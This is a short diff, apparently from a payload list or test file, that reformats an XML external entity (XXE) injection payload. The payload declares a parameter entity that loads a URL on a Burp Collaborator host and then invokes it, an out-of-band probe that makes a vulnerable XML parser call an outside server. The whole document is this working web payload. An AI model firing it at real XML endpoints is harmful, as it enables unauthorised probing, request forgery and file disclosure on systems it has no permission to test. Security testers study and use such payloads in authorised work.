@@ -1,1 +1,2 @@
-<!ENTITY % xxe1 SYSTEM "http://aa.75agkz0fyfwkm3txklketr6dp4v0jp.burpcollaborator.net/aa"> %xxe1;
+<!ENTITY % xxe1 SYSTEM "http://aa.75agkz0fyfwkm3txklketr6dp4v0jp.burpcollaborator.net/aa"> 
+%xxe1;
